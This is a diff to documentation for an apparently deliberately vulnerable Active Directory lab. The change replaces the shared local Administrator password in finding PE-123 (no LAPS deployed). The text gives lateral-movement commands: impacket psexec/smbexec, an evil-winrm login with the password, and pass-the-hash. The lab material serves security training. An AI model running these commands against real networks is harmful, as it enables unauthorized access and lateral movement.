@@ -17,12 +17,12 @@ try {
 PE-123: LAPS Not Deployed — Uniform Local Admin Password
 ==========================================================
 No LAPS (Local Administrator Password Solution) is deployed in this lab.
-All machines use the same local Administrator password: DVADlab2024!
+All machines use the same local Administrator password: SithLord123!
 
 Attack (lateral movement after any local admin access):
   Any machine local admin credential → access to all machines via:
     - SMB: psexec/smbexec/wmiexec (impacket)
-    - WinRM: evil-winrm -i <ip> -u Administrator -p DVADlab2024!
+    - WinRM: evil-winrm -i <ip> -u Administrator -p SithLord123!
     - PtH: impacket-smbexec CORP/Administrator@<ip> -hashes :<hash>
 
 LAPS read ACL (if LAPS were deployed):
